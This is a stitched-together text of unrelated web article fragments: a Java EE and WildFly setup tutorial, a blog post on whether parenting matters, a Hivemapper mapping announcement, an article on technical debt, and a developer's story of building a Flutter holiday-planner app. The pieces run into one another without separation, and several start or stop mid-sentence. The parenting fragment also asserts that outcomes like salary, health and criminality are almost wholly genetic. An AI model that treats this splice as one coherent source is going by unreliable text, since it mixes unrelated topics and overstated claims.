implements every part of the Java EE specification, and can therefore be referred to as a <strong>(Full) Java EE application server</strong>.</p>
<p>Below's an overview of the most popular Java EE servers.</p>

<p>When deploying a Java EE application to some server, there will be lots of additional libraries available on the classpath at runtime.
These are all <em>implementation libraries</em> for the different Java EE API modules which the application might depend on.
So there's a big difference between <em>compile-time</em> API libraries and <em>runtime</em> implementation libraries.</p>
<hr>
<p>For example, by having a Maven <em>compile</em> dependency on the (full) <a href="https://mvnrepository.com/artifact/javax/javaee-api">Java EE API</a> library,
you'll be able to decorate your classes and methods with the <code>@Path</code> and <code>@GET</code> annotations (part of JSR 370)
and create a simple HTTP endpoint like this:</p>
<pre><code><span>@Path</span><span>(</span><span>"/ping"</span><span>)</span>
<span>public</span> <span>class</span> <span>PingResource</span> <span>{</span>

    <span>@GET</span>
    <span>public</span> <span>Response</span> <span>ping</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> <span>Response</span><span>.</span><span>ok</span><span>(</span><span>"Ping"</span><span>)</span><span>.</span><span>build</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>

<span>}</span></code></pre>
<p>In and of themselves, Java runtime annotations don't do anything.
That's why the application server has an <em>implementation library</em> for JSR 370, which it places on the classpath during runtime.
This implementation would then have a built-in mechanism which scans your application for all classes with the <code>@Path</code> annotation,
and register them as HTTP endpoints.</p>
<hr>
<p>Server developers typically choose to implement most of the <a href="https://jcp.org/en/jsr/all">500+</a> JSRs themselves.
Often, these implementation are then packaged into standalone libraries so that, in theory,
they can be re-used by other server developers.</p>
<p>As such, there are typically only 1 or 2 popular implementation libraries for each specification,
which may or may not find their way into the standard configuration of multiple different application servers over time.</p>

<a href="#jboss-wildfly"><h2 id="jboss-wildfly">JBoss WildFly</h2></a>
<p>JBoss used to be the name of a company which has developed one of the most popular Java EE application servers in the world:
<a href="https://www.redhat.com/en/technologies/jboss-middleware/application-platform">JBoss EAP</a> (Enterprise Application Platform).
The other application server which JBoss is known for, is called <a href="https://www.wildfly.org/">WildFly</a>.
The difference? Technically, nothing.
WildFly is the free community edition
and JBoss EAP is the paid enterprise edition (with official support)
of the <em>same</em> application server.</p>
<p>As a sidenote, JBoss actually got acquired by <a href="https://www.redhat.com/">RedHat</a> in 2006.
And then, in 2019, RedHat got acquired by <a href="https://www.ibm.com/">IBM</a>.
So the JBoss EAP / WildFly server is technically part of IBM's portfolio now,
together with IBM's self-developed Java EE application server called <a href="https://www.ibm.com/cloud/websphere-application-platform/">WebSphere</a>.</p>
<p>We'll be working with the <strong>JBoss WildFly</strong> application server (version <strong>20</strong>) in the build-along section of this article.</p>
<a href="#project-overview"></a>
<p>We'll be working on a Java EE application with the following features:</p>
<ul>
<li>customers can sign up via the <code>POST /accounts</code> endpoint<ul>
<li>their <code>name</code> and <code>email</code> are saved into the database</li>
<li>they're sent a welcome e-mail</li>
</ul>
</li>
<li>all accounts can be queried via the <code>GET /accounts</code> endpoint</li>
<li>a single account can be queried via the <code>GET /accounts/{id}</code> endpoint</li>
</ul>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/project-overview.svg" alt="diagram containing the basic 3-tiered architecture: resource, service and repository"></p>
<p>You can find the full source code of the final application on
<a href="https://github.com/jessym/tutorials/tree/master/a-complete-introduction-to-java-ee">GitHub</a>.
If you would like to follow along, please make sure to have the following tools installed:</p>
<ul>
<li><strong>Java 11</strong> - newer language versions aren't supported by the WildFly version we're going to pick later</li>
<li><strong>Maven</strong></li>
<li><strong>Docker Compose</strong> - for running the database locally</li>
<li><strong>IntelliJ</strong></li>
</ul>
<a href="#wildfly-setup"></a>
<p>Start out by downloading the <strong>JBoss WildFly 20.0.0.Final</strong> application server (Java EE Full &amp; Web Distribution)
from the official <a href="https://www.wildfly.org/downloads/">downloads page</a>.
Once it's downloaded, unzip the the archive to a convenient location or simply leave it
inside your <code>~/Downloads/</code> folder (which is what I will do).</p>
<p>I shall refer to the WildFly root directory as <code>$JBOSS_HOME</code> from now on,
which would resolve to <code>~/Downloads/wildfly-20.0.0.Final/</code> on my system.</p>
<p>To <em>start</em> this server, simply <code>cd</code> into the <code>$JBOSS_HOME/bin/</code> folder and run the <code>./standalone.sh</code> script.
After a few seconds, you should be able to visit <a href="http://localhost:8080/">localhost:8080</a>
and be greeted with the following welcome screen.</p>
<p><img src="https://www.jessym.com/articles/a-complete-introduction-to-java-ee/wildfly-welcome-screen.png" alt="WildFly welcome screen"></p>
<p>(To stop the server,
simply press Cmd + C or Ctrl + C from the terminal window where the <code>./standalone.sh</code> script is running.)</p>
<p>WildFly also comes with a useful management dashboard, available at <a href="http://localhost:9990/">localhost:9990</a>,
from where we'll be able to view runtime stats about WildFly itself and all Java EE applications deployed to it.
In order to access the dashboard, we'll have to create a management user first, though.
To do so, <code>cd</code> into <code>$JBOSS_HOME/bin/</code> and run the <code>./add-user.sh</code> script.</p>

<p>Every parent should read this article: <a href="https://www.todaysparent.com/family/nature-vs-nurture-does-parenting-even-matter/">Does parenting even matter?</a></p>



<p>Here are some money quotes.</p>



<p><em>On the things we think are important:</em></p>



<blockquote><p>Things like which school your child goes to, whether they travel, how many books you read them when they’re small and how hard (or if) you push them into certain activities, aren’t likely to have much, if any, effect on who they fundamentally are now, or who they become.</p></blockquote>



<p><em>On changing their personality:</em></p>



<blockquote><p>If your child is defiant and strong-willed, they’re almost certainly going to spend their life challenging authority whether you run your household on a strict military timetable or unschool them in a yurt.</p></blockquote>



<p><em>On setting them up for success:</em></p>



<blockquote><p>Many character traits widely assumed to be the result of environmental factors and social conditioning—like curiosity, diligence, intelligence, fastidiousness, academic inclination and drive—are, in fact, highly heritable.&nbsp;</p></blockquote>



<p><em>On why parenting still matters:</em></p>



<blockquote><p>Parenting does matter—of course it does—just not in the overly complicated, competitive, anxiety-ridden way most of us have been led to believe. Our kids are born who they are. As parents, it’s our job to love, support, accept and enjoy them. The rest is gravy.</p></blockquote>



<p>The book <a href="https://www.goodreads.com/book/show/10266902-selfish-reasons-to-have-more-kids">Selfish Reasons to Have More Kids</a> is all about this concept. If you meet a very low bar for parenting then your kids are going to turn out how they’re going to turn out. </p>



<p>There are decades of identical twin and adoption studies to back it up. Those studies have only linked a few things to upbringing. Religious and political affiliation are two examples. </p>



<p>Everything else has little to no correlation. That includes salary, education level, health (smoking/drinking, cavities, etc.), grades in school, criminal behavior, etc. It’s genetics all the way down for those.</p>



<p>That’s disturbing, right? There’s nothing I can do to help my kids grow up to be healthy or well paid or educated? Yeah, but it’s also freeing. Our job is to love our kids and give them happy memories to look back on. We can focus on the fun stuff, because that’s the stuff that matters. The rest, as the article says, is gravy.</p>

We take them for granted and yet they’re critical and everywhere. But maps cost billions to produce and therefore don’t get updated frequently enough for businesses and machines that require up-to-date data.</p><p id="a0c7">To create a fresh and intelligent 3D map of the world, <a href="http://hivemapper.com/" rel="noopener">Hivemapper</a> combines a new software approach to making maps, with a <a href="https://hivemapper.com/collectors" rel="noopener">mapping network</a> of commodity drones and <a href="https://hivemapper.com/open-dash" rel="noopener">dashcam</a> to grow and update the map. The global 3D map we are building is scaling and updating four times faster, and at a fraction of the cost, of traditional mapping companies.</p><p id="2123">By comparison, where Google Maps deploys a small number of highly specialized cars driving around the world, we engage with an unlimited number of contributors who only need a dashcam or off-the-shelf drone to participate. Here’s a quick peek:</p></div></div><div><div><p id="255d">Since February 2020, collectors in the Hivemapper mapping network have been rapidly adding to and growing the global map:</p><ul><li id="8835"><strong>9,000 sq km </strong>— in more than 80 countries — have been mapped</li><li id="7fa3"><strong>50% monthly growth</strong> of the global map</li><li id="248f">In just one week, areas of the map have grown from <strong>1 to 90 sq. km</strong> — about three Manhattans</li></ul><p id="214d">Hivemapper regards a decentralized mapping network as critical mapping infrastructure necessary to democratize mapping, make mapping a utility like storage and bandwidth, and fuel the business use-cases and autonomous machines that require up-to-date 3D maps.</p><p id="5fbc">In a static world — no new roads, no closures, no natural disasters, no new development existing approaches to building and updating 2D and 3D maps are satisfactory. Yet, the physical world is changing faster than ever. Urbanization, climate change, autonomous transportation, and now pandemics are driving 15% of the global road network to change annually.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/4560/1*bvdIk7dlMi1TC6r_baxykg.png" width="2280" height="1288" srcset="https://miro.medium.com/max/552/1*bvdIk7dlMi1TC6r_baxykg.png 276w, https://miro.medium.com/max/1104/1*bvdIk7dlMi1TC6r_baxykg.png 552w, https://miro.medium.com/max/1280/1*bvdIk7dlMi1TC6r_baxykg.png 640w, https://miro.medium.com/max/1400/1*bvdIk7dlMi1TC6r_baxykg.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*bvdIk7dlMi1TC6r_baxykg.png?q=20"></p></div></div></div><figcaption>The world is changes faster, and today’s maps cannot keep up</figcaption></figure><p id="49e3">Today, Big Tech mapping companies spend billions of dollars to deploy fleets of highly specialized vehicles, fly airplanes equipped with advanced camera systems, and even launch satellites. Given the enormous expense, maps are rarely updated and companies apply expensive and restrictive licensing agreements to their use. For businesses that rely on maps for mission critical monitoring and navigation an out-of-date map is a serious issue:</p><ul><li id="f163">Google Maps was not updated for 12 months after the devastating fires in Santa Rosa (California) destroyed homes and infrastructure.</li><li id="89a6">Because Google and others are too slow to update, a delivery company operating in the Detroit area had to collect their own data for maps using multiple tools.</li><li id="750d">Each year 20% of structures in Dallas change; a delivery company hires teams of people to manually update these to reduce costly rejected deliveries.</li></ul><p id="2b88">However important maps already are, updated 3D maps are a mission critical piece of infrastructure for the navigation systems of autonomous vehicles. Feeding an out-of-date map to an autonomous vehicle is potentially catastrophic. The lack of large scale affordable and accurate 3D maps remain a key obstacle preventing the autonomous transportation promise from becoming an everyday reality.</p><p id="673f">We believe there are three pillars required to build and deliver a decentralized mapping network capable of turning 3D maps into an affordable and accessible utility for businesses and machines that require up-to-date maps.</p><p id="b314">When anyone with a commodity dashcam or drone can collect and contribute video it shifts the challenge from a costly logistics and hardware problem into a challenging software opportunity.</p><p id="1ba7">The <a rel="noopener" href="https://blog.hivemapper.com/engineering-a-living-map-introduction-4d4b3e5f28e8">technical breakthrough</a> of Hivemapper is that, leveraging modern compute power we can take nearly any source video of the physical world and convert it into an accurate 3D map. Additionally, the Hivemapper technology does not require all of the video to be produced by one source in a highly structured and organized way. Instead, Hivemapper receives, processes and transforms disparate videos into an accurate and intelligent 3D map.</p><p id="22f6">Think of the Hivemapper map as a puzzle where each video uploaded to Hivemapper forms one piece. The puzzle is only complete when each piece is in its proper place and Hivemapper makes all of the individual pieces come together.

Over the last few years, we have devised novel ways to reduce the compute cost of creating the map enabling us to scale economically. Just in the last few months we have reduced the cost to compute by an additional 60% — a cost that will come down materially with additional scale.</p><p id="bf41">Because Hivemapper is designed to work in the cloud and at the edge from inception. Everything on <a href="http://hivemapper.com/map" rel="noopener">Hivemapper.com</a> can be deployed on a high-end gaming PC. When maps are produced on-premise, we spread the compute costs across many thousands of devices that are otherwise sitting idle.</p><p id="73d8">Our platform allows us to move more of the processing to the edge. All maps produced at the edge can be merged into the global 3D map hosted at <a href="http://hivemapper.com/" rel="noopener">hivemapper.com</a>. In 2021, we will take another big leap in reducing compute costs. Stay tuned.</p><p id="8aa6">The Hivemapper map is built from video collected by commodity drones, empowering virtually anyone to become a collector and earn additional income. Our approach provides an affordable, accessible alternative to the expensive and specialized mapping vehicles and satellites.</p><p id="673a">Earlier approaches to crowdsourced mapping required learning complex GIS interfaces involving tedious amounts of tracing lines across stale satellite imagery.

October 23, 2020 | https://labcodes.com.br/blog/articles/tech-debt.html | <a href="https://web.archive.org/web/*/https://labcodes.com.br/blog/articles/tech-debt.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>As you can see, this is a well-known monument in Italy, more specifically in Pisa, hence it’s name: <strong>Tower of Pisa.</strong></p>
<p><img alt="Pisa Tower picture" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower.png"></p>
<p>This tower has a very interesting history, it was built around the 12th century, but due to the soft ground it was built on, it started tilting. The structure was only stabilized in 2001 after 8 years of remedial work.</p>
<p>Actually, one of the corrections made during these 8 years made the tilting even worse!
Let those who never made a refactoring that made the problem worse throw the first stone. I can’t really blame anyone haha.</p>
<h2>John, the <em>purrgrammer</em></h2>
<p><img alt="John working in a computer" src="https://labcodes.com.br/blog/images/tech-debt/chico-the-purrgrammer.png"></p>
<ul>
<li>This is John.</li>
<li>John is a Senior Developer always with a lot on his plate.</li>
<li>John is also an amazing programmer with a lot of years of experience.</li>
</ul>
<p>Suddenly, a new project arrived at John’s desk, and it needed:</p>
<p><img alt="John playing with a ball" src="https://labcodes.com.br/blog/images/tech-debt/chico-features.png"></p>
<ul>
<li>Payment System</li>
<li>Social Network Authentication</li>
<li>Delivery services integration</li>
</ul>
<p>Since John is an excellent professional that always delivers his activities, he tackled the new project head-on and delivered it in time.</p>
<p><img alt="John is happy because he delivered the project in time" src="https://labcodes.com.br/blog/images/tech-debt/chico-delivered.png"></p>
<p>After John’s delivery, the rest of his team went on to review his code, and they discovered a few problems, such as:</p>
<p><img alt="Cat's reviewing John's code" src="https://labcodes.com.br/blog/images/tech-debt/chico-team-review.png"></p>
<ul>
<li>Bugs and inconsistency on payments</li>
<li>Sometimes the deliveries weren’t processed</li>
<li>Authentication was too simple when checking the social networks used</li>
</ul>
<p><img alt="John is sad because his project had some bugs" src="https://labcodes.com.br/blog/images/tech-debt/chico-bugs.png"></p>
<p>John knew his code had a few bugs. But nearing the deadline, another project appeared and it took a lot of John’s time, so he couldn’t go back and fix the problems.</p>
<p>John and his team had to deliver the project riddled with bugs and problems.</p>
<p>But John kept a positive attitude.</p>
<p>“In the future, I’ll go back and fix those bugs”</p>
<p><img alt="John is happy again, he knows that in the future he'll fix everything" src="https://labcodes.com.br/blog/images/tech-debt/chico-refactoring-en.png"></p>
<h3>SPOILER</h3>
<p>C’mon, did you really think that this was going to happen?</p>
<p><img alt="The problems in John’s project" src="https://labcodes.com.br/blog/images/tech-debt/problems-on-chicos-code-en.png"></p>
<p>Let’s dive deeper into the problems of John’s code: </p>
<ul>
<li>Payments couldn’t be processed in different currencies</li>
<li>If the delivery system is offline, the code wouldn’t work</li>
<li>Users with deactivated accounts could still access the system</li>
<li>No automated testing</li>
</ul>
<p>And this, my friends, is what we know as Technical Debt. Why?</p>
<p>Because what happened was that John chose the first solution he could think of in that short deadline, this affected the code’s quality and the team accepted this. In the future, if any logistics of the business, such as accepting different kinds of currency or changing the delivery service, needs to be changed, the <strong>Changing Cost</strong> of the code is going to be enormous. The moment John chose the faster and easiest solution for him was the moment that the Technical Debt was inserted in the code.</p>
<p>What happened with the Tower of Pisa is a lot like what we understand as Technical Debt.</p>
<p><img alt="Picture from the Tower under construction" src="https://labcodes.com.br/blog/images/tech-debt/pisa-tower-construction.png"></p>
<p>It probably started off as a couple of small mistakes and problems, but the constructors decided to ignore them and build and scale on top of these problems. The tower was built so fast that these little “bugs” in the construction jeopardized the whole structure.</p>
<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>
<h3>1. I.M.P.A.C.T</h3>
<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>
<p>As we can see, the cost of a software built without …</p></div></div>

<p><em>“One day, 7 apps, of course… How long was that day? 168 hours? Define ‘one day’!"</em><br>
Are you looking for the <a href="#definition-of-one-day">definition</a>?</p>
<h2 id="the-story">The Story</h2>
<p>Usually, every product story starts with a pain, a problem that needs to be solved. A problem that bothers you, annoys you, you face it frequently and probably you are not alone with it.<br>
This case was not different either.</p>
<p>A few months ago we started to use a new HR system that has a lot of advantages compared to the old one. But it had disadvantages too… Missing functionality, missing information… or the information is there, but hard to get it out from the system.</p>
<p>That’s when the idea of <a href="https://pandoo.tweaked.tech/">Pandoo</a> (the holiday planner) was born.</p>

<h2 id="the-problem">The Problem</h2>
<p>The new tool did lack some features that we got used to.</p>
<p>A nice(r) and clean(er) way to see all of your holidays, your team’s holidays (and type of those holidays), and book them in a bunch.</p>
<p><strong>Disclaimer:</strong> <em>Maybe some of these problems are manageable with admin configurations or with educating the users.. but usually, when people switch tools they just expect that “it works” and they have all the things they had previously plus nice extras.</em></p>
<p><em>The goal of this article is not to blame the tool, it is about the solution and the key learnings.</em></p>
<h2 id="the-solution">The Solution</h2>
<p>I wanted to bring back the functionalities from the old tool. I wanted to see my holidays as I was used to, I wanted to book my holidays as I used to. And I was not alone with this.</p>
<h3 id="the-requirements">The Requirements</h3>
<ul>
<li>I don’t want to waste too much time on the MVP, just get it to work with the basic functionality and make me happy.</li>
<li>There is no way that I will build multiple apps using multiple programming languages.</li>
<li>Mobile-first, but bigger screen support would be nice where I can see more data.</li>
<li>Challenge myself.</li>
</ul>
<h3 id="the-choice">The Choice</h3>
<h4 id="flutter">Flutter</h4>
<figure>
<img src="https://danieldallos.com/images/flutter-pandoo/flutter.png" alt="Flutter logo">
</figure>
<p>Why?</p>
<ul>
<li>Flutter’s promise</li>
</ul>
<p><a href="https://flutter.dev/">Flutter</a> is a cross-platform tool made by Google, that helps you <strong>build native mobile apps from a single codebase</strong>.<br>
<em>(Edit (19/09/2020): This has been changed a bit as you will see it later. )</em></p>
<ul>
<li>I had some experiences already.</li>
</ul>
<p>I have built <a href="http://edengreen.tweaked.tech/">Edengreen</a>, a tool that helps you check your available meal vouchers.<br>
It is a really basic app, but it taught me the basics of how Flutter works. At this time Flutter was still in beta.</p>
<p>One of my other projects was <a href="https://coronavirusalert.tweaked.tech/">CoronaVirus Alert</a>, a tool that monitors the infections country by country and sends you push notifications.<br>
In this project, I have played with Firebase, serverless functions, and custom scripts here and there. I have learned that there is a <strong>big pool of third-party libraries</strong> for Flutter and <strong>the community is growing rapidly</strong> too.</p>
<ul>
<li>Web support</li>
</ul>
<p>I have never tried, but apparently, there was rudimentary Web support too.</p>
<ul>
<li>The challenge</li>
</ul>
<p>My previous projects helped me to understand the basics but I wanted to achieve more and the Web support was sounded interesting too.</p>
<h3 id="know-your-stuff">Know Your Stuff</h3>
<p>I needed a giant scrollable table view where horizontally I can show the days of the year and vertically all of my colleagues and their holidays.<br>
This sounds easy, but in reality, it never is. Weird, annoying edge-cases when you are almost done, lack of Flutter knowledge from my side, unforeseen platform limitations, etc…</p>
<p>I wanted to see what is available already by the community, maybe there is something that is similar and it can fit my needs (with minimal tweaking). Luckily I have found the <a href="https://pub.dev/packages/horizontal_data_table">horizontal_data_table</a> package, that provided 90% of what I have needed… I have forked the package and did some fine-tuning for my needs on the way.</p>
<p>Getting the data from the HR tool was pretty easy, they provide a nice REST API to interact with the back-end.</p>
<p>When you connect the dots you have to be cautious. You need to know what you expect from your tool, how it is going to work. How does it get the data? Do we need to store the data locally? Do we need an extra server-side logic too? Do we plan to use any exotic UI elements?</p>
<p>These are important questions, because when you pick a library/package in Flutter and e.g. if it works on Android it does not mean automatically that it works on iOS too… or even on the Web. You need to pick libraries that rely on the default native support and no additional native third-party libraries. (Or the reliance on those libraries needs to be complete on every side.)</p>
<p>For example, if you would like to use Firebase services in your app, you need to check which platforms <a href="https://github.com/FirebaseExtended/flutterfire">are supported</a>. <strong>If your target is not, probably you will face a runtime crash when Flutter tries to access the non-existent APIs.</strong></p>
<p>When you search for a Flutter package in the official <a href="https://pub.dev/">Dart/Flutter package repository</a>, you can also see which platforms are supported.</p>

</figure>
<h3 id="3-apps-at-once">3 Apps at Once</h3>
<p>Based on past experiences in the MVP I did not choose any special external library (except the horizontal_data_table) because I wanted to limit the compatibility issues between iOS, Android, and Web.</p>
<p>After I was done with the minimal version, I tested the implementation on Android and iOS.<br>
It worked and looked nice! (Sure, it had some performance issues here and there while scrolling through the holidays of the whole company… but on a limited dataset it was good.)</p>

<p>So now we have <strong>two apps</strong> ready to use!</p>
<p>Let’s see how it works on the Web.<br>
Of course, it crashed in a few places 😀.
But nothing serious that a good old “if-else” could not solve. I have still used some APIs that were not available on the Web, so I needed to use <code>kIsWeb</code> <a href="https://api.flutter.dev/flutter/foundation/kIsWeb-constant.html">constant</a> to differ the logic between Web and native mobile.</p>
<p>It also had some UI quirks due to unsupported/buggy UI elements (<a href="https://github.com/flutter/flutter/issues/45505">with gradients</a>), but it was good enough for the current phase.</p>

<p>We have the <strong>third app</strong> too, and you could say <em>“Ok, you are done, you have it all, Web runs on all platforms”</em>.</p>
<p>But wait, there is more!</p>
<h3 id="the-meetup-and-the-extra-3-apps">The Meetup and The Extra 3 Apps</h3>
<p>I really like Meetups. I can meet with like-minded people, listen to good and interesting presentations, and sometimes <a href="https://www.meetup.com/gdg-brussels/photos/27573830/457831934/">I give a talk too</a> 😊.</p>
<p>There was a promising Meetup from <a href="https://www.meetup.com/gdg-brussels/events/268503398/">GDG Brussels on Flutter topic</a>. Based on the presentation summary, it intended to be a basic Flutter intro and the experiences of the author.<br>
So it could be nothing interesting for me, I am kinda done with the basics… but I always like to repeat similar things, because maybe I can discover a new bit of information that can change my perspective and start me thinking.
For the same reason, I read/listen to books on similar topics too… even the 95% is the same as a previous book, the remaining 5% is worth the time.</p>
<p><strong>Luckily this case was not different either.</strong><br>
The presenter walked through their app development challenges and how quickly they have re-implemented the apps from scratch in Flutter.</p>
<p>Then he showed something interesting. His app was in a weird-looking window. It looked like a browser or a bezel-less iOS simulator. Apparently, it was his application compiled into a <strong>native MacOS app</strong>. It turned out that Flutter added support for <a href="https://flutter.dev/desktop">Desktop</a> platforms. Obviously, this was even in an earlier stage than the Web support, but it is worth a try.</p>
<p>The next day I tried it, it worked! I had Pandoo as a native MacOS app. Meanwhile, I have discovered that there is also really basic support for Linux and Windows… After the initial setup of the environments in VirtualBox, I could compile Pandoo as a <strong>native Windows and Linux app</strong> too! 🎉</p>
<p>Sure, there were some extra limitations on Windows and Linux, I had to do some extra “if-else” conditions. E.g. there was no persistent storage API available on these platforms, so I could not save any data to the disk.<br>
<em>(Edit (19/09/2020): Later I did polyfill these missing features by using the default Dart file reading and writing APIs.)</em></p>
<p>Extra <strong>three apps are done</strong>. Sounds good, doesn’t it?</p>

<h3 id="1">+1</h3>
<p>We can argue on this if it counts as the seventh app or not. But it was such a nice surprise to me, so please allow me to count it as +1.</p>
<p>While I was testing Pandoo in the Chrome Browser on my phone, I got a popup that asked me if I would like to add Pandoo to my home screen. Sure, why not. But this icon on my home screen looked different from another page link. And… it also appeared between my apps in the Launcher. What?</p>
<p>It turned out that the <strong>Web apps built by Flutter are PWA applications</strong> too. So even if the device is offline, you can open and use the web apps.
Or, you could… if a webpage is made for that. In my case I don’t cache any data from the HR tool, I fetch all the data from the API every time.
That means when Pandoo is loaded inside the browser and you try to use it without an Internet connection, it shows an API error (just like all the other versions of the app). I could save the last fetched data locally and load it immediately at app start (while the new is loading)… but for now, it is ok as it is.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I think Flutter is a strong candidate in the app development era. Not only for mobile but in general.</p>
<p>I did not write a single line of code to have a Mac OSX app. Although I have some experiences with Mac OSX apps (<a href="https://mike.tweaked.tech/">Mike</a>) so I would have an idea where to start, it is not a copy/paste from an iOS app, you need to put some work there. Hopefully <a href="https://developer.apple.com/mac-catalyst/">Mac Catalyst</a> will help with this in the future.</p>
<p>Write an app for Windows and Linux? I would not even think about it.</p>
<p>The additional Web support is really nice, and it can be really useful. For example, if you have a Revolut and TransferWise account you probably noticed that the mobile apps are very similar to each other, and they also provide a Web version too with a limited feature set. I don’t know what technologies they use, but (if not Flutter already) I can imagine in the future these kinds of services will consider Flutter for their apps.</p>

